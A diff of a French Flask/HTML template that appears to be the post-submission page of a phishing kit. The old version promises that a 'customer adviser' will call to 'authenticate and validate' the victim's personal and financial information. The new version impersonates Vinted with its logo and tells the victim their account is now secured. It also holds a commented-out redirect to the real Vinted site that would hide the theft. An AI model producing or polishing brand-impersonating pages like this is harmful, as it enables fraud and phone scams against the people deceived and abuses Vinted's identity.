@@ -1,111 +1,90 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sécurisation des Informations</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    html, body {
-      height: 100%;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed; /* Utilise le même fond */
-      background-size: cover;
-      background-position: center center;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      color: #333; /* Couleur de texte générale */
-    }
-
-    /* **SECTION DÉJÀ CORRIGÉE POUR L'ARRIÈRE-PLAN MOBILE** */
-    @media (max-width: 480px) {
-      html, body {
-        background-size: contain; /* Ajuste l'image pour qu'elle tienne entièrement dans l'écran */
-        background-position: top center; /* Centre l'image en haut de l'écran */
-        background-repeat: no-repeat; /* Empêche la répétition de l'image */
-        background-attachment: scroll; /* L'image défile avec le contenu sur mobile */
-      }
-      .modal { /* Note: Pour cette page, la classe principale est .security-container, pas .modal */
-        padding: 20px 15px; /* Conserve le padding ajusté pour les petites tailles d'écran */
-      }
-      input, button {
-        font-size: 15px; /* Conserve la taille de police ajustée */
-      }
-    }
-
-    .security-container {
-      background-color: white;
-      width: 90%;
-      max-width: 500px; /* Plus large pour le contenu du message */
-      padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15); /* Ombre plus prononcée */
-      text-align: center;
-      animation: fadeIn 0.8s ease-out; /* Animation d'apparition */
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .security-icon {
-      font-size: 60px; /* Grande icône */
-      color: #007b76; /* Couleur de l'icône (vert-bleu) */
-      margin-bottom: 25px;
-    }
-
-    h1 {
-      font-size: 28px;
-      margin-bottom: 20px;
-      color: #333;
-    }
-
-    p {
-      font-size: 16px;
-      line-height: 1.6;
-      margin-bottom: 25px;
-      color: #555;
-    }
-
-    .highlight {
-      font-weight: bold;
-      color: #007b76; /* Met en évidence les mots clés */
-    }
-
-    .button-home {
-      display: inline-block;
-      background-color: #6DC0B6; /* Bouton dans la même palette de couleurs */
-      color: white;
-      padding: 12px 25px;
-      font-size: 17px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      text-decoration: none; /* Pas de soulignement pour le lien-bouton */
-      transition: background-color 0.3s ease;
-    }
-
-    .button-home:hover {
-      background-color: #5aa79f;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Votre compte est sécurisé - Vinted</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .security-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+        }
+        .logo {
+            margin-bottom: 25px;
+        }
+        .logo img {
+            max-width: 150px;
+            height: auto;
+            border: 0;
+        }
+        h1 {
+            font-size: 28px;
+            color: #28a745; /* Vert pour le succès */
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .message-success {
+            font-weight: bold;
+            color: #28a745;
+        }
+        .note {
+            font-size: 14px;
+            color: #777;
+            margin-top: 30px;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 25px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #007b76;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+        .button:hover {
+            background-color: #00605c;
+        }
+    </style>
 </head>
 <body>
-  <div class="security-container">
-    <div class="security-icon">🔒</div> <h1>Enregistrement En Cours</h1>
-    <p>
-      <span class="highlight"> Un conseiller client vous contactera </span>. <span class="highlight">pour authentifier et valider vos informations</span> <span class="highlight"></span>dans quelques instants.
-      Nous tenons à vous informer que la sécurité de vos données est notre <span class="highlight">priorité absolue</span>.
-      Vos informations personnelles et financières sont protégées par des <span class="highlight">mesures de cryptage</span> avancées et une surveillance constante pour garantir une <span class="highlight">protection maximale</span>.
-    </p>
-    <a href="/" class="button-home">Retour à l'accueil</a> </div>
+    <div class="security-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+        <h1>Compte sécurisé !</h1>
+        <p class="message-success">Vos informations ont été mises à jour avec succès et votre compte est maintenant pleinement sécurisé.</p>
+        <p>Vous pouvez reprendre vos activités sur Vinted en toute tranquillité. Merci pour votre coopération.</p>
+        <p class="note">Vous serez automatiquement redirigé(e) vers la page d'accueil de Vinted ou pouvez cliquer sur le bouton ci-dessous.</p>
+        <a href="/" class="button">Retourner à Vinted</a>
+
+        <script>
+            // Redirige après un certain délai si nécessaire (par exemple 5 secondes)
+            // setTimeout(function() {
+            //     window.location.href = "https://www.vinted.fr/"; // Ou l'URL officielle de Vinted
+            // }, 5000);
+        </script>
+    </div>
 </body>
 </html>
